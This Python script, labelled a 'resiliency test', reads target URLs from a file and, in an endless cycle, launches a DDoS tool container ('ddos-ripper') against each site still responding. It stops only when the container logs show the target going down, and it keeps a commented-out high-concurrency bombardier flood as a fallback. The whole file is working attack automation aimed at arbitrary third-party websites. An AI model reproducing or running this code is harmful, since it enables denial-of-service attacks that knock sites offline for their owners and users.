import time

import docker
import requests
from docker.errors import NotFound
from requests import ReadTimeout
from requests.exceptions import ConnectionError
from timeout_decorator import timeout_decorator


class DockerSetup(object):
    def __init__(self):
        self.command = None
        self.image = None

    def get_image(self) -> str:
        return self.image

    def get_command(self) -> str:
        return self.command


class BombardierSetup(DockerSetup):
    def __init__(self, duration: int, request_timeout: int, test_url: str):
        super().__init__()
        self.image = 'alpine/bombardier'
        self.command = f"-c 500 --duration {duration}s --timeout={request_timeout}s -l {test_url}"


class RipperSetup(DockerSetup):
    def __init__(self, duration: int, request_timeout: int, test_url: str):
        super().__init__()
        self.image = 'nitupkcuf/ddos-ripper'
        self.command = "www." + test_url.replace("http://", "").replace("https://", "")


def start_the_infinite_resiliency_test(duration=300):
    """
    Load test all urls from file if they are active
    Load test for each URL has a given time out
    :param duration:
    """
    cycle = 1
    while True:
        lines = _read_file_lines()
        for test_url in lines:
            test_url = test_url.rstrip("\n")
            _load_test_the_url(test_url, duration)

        print(f"finished {cycle} cycle")
        cycle += 1


def _load_test_the_url(test_url, duration):
    try:
        requests.get(test_url, timeout=30)
        _run_bombardier(test_url, duration)

    except (ConnectionError, ReadTimeout) as e:
        print(f"{test_url} is already down")

    except StopIteration as e:
        print(f"{test_url} load test took over 700 seconds")

    except Exception as e:
        print(f"failed to process {test_url}")


def _print_container_log(log: str):
    print_line = False
    text_to_print = ""
    lines = log.split("\n")
    for line in lines:
        if "Statistics" in line:
            print_line = True
        if "Errors:" in line:
            print(text_to_print)
            break
        if print_line:
            text_to_print += line + "\n"


def _run_docker(test_url: str, duration: int):
    start = time.time()
    do_ripper = True
    ripper_setup = RipperSetup(
        duration=duration,
        request_timeout=30,
        test_url=test_url
    )

    print(f"Start ripper for {test_url}")
    client = docker.from_env()
    docker_id = client.containers.run(
        image=ripper_setup.get_image(),
        tty=True,
        command=ripper_setup.get_command(),
        detach=True,
        remove=True,
    ).id
    container = None

    try:
        while time.time() - start < duration and do_ripper:
            time.sleep(10)
            container = docker.from_env().containers.get(docker_id)
            container_logs = container.logs().decode('utf-8')
            count_rippering = container_logs.count("rippering")
            count_down = container_logs.count("down")

            if count_down / count_rippering > 0.5:
                do_ripper = False

        if container is not None:
            docker.from_env().containers.get(docker_id).stop()

        print(f"Stopped ripper for {test_url}")

    except NotFound as e:
        print(f"Failed to ripper {test_url}")

        # new_duration = duration - (time.time() - start) - 1
        # if new_duration > 1:
        #     print(f"Start bombardier for {test_url}")
        #     bombardier_setup = BombardierSetup(
        #         duration=int(new_duration),
        #         request_timeout=30,
        #         test_url=test_url,
        #     )
        #
        #     decoded_container_log = run_container_and_wait_for_logs(bombardier_setup)
        #     _print_container_log(decoded_container_log)


def run_container_and_wait_for_logs(docker_setup: DockerSetup):
    """ Run docker command and return decoded logs

    :param docker_setup:
    :return:
    """
    client = docker.from_env()

    return client.containers.run(
        image=docker_setup.get_image(),
        tty=True,
        command=docker_setup.get_command(),
        detach=False,
        remove=True,
    ).decode("utf-8")


@timeout_decorator.timeout(700, timeout_exception=StopIteration)
def _run_bombardier(test_url, duration):
    print(f"Start Testing {test_url}")
    _run_docker(test_url, duration)
    print(f"Finished testing {test_url}")


def _read_file_lines():
    file1 = open('urls_list.txt', 'r')
    lines = file1.readlines()
    return lines


if __name__ == '__main__':
    start_the_infinite_resiliency_test(duration=600)
